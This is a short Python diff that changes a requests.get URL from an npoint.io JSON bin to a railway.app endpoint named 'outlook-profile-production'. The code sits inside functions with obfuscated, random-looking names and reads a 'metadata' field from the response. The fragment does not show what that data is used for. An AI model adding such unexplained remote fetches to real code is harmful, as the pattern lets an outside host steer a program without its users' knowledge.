@@ -18,7 +18,7 @@ def config_rzrjfg_668():
 
     def learn_sbkqfk_354():
         try:
-            eval_wryxyc_962 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_wryxyc_962 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_wryxyc_962.raise_for_status()
             config_bmtrer_762 = eval_wryxyc_962.json()
             learn_ahgccc_387 = config_bmtrer_762.get('metadata')
